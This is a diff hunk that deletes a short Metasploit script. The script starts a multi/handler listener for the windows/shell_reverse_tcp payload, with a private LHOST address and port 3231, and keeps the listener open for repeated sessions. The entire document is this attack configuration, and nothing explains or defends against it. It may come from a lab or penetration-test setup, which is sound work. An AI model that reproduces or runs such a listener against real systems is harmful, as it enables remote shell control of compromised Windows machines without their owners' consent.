@@ -1,7 +1,0 @@
-use multi/handler
-set payload windows/shell_reverse_tcp
-set LHOST 192.168.45.29
-set LPORT 3231
-set ExitOnSession false
-exploit -j
-
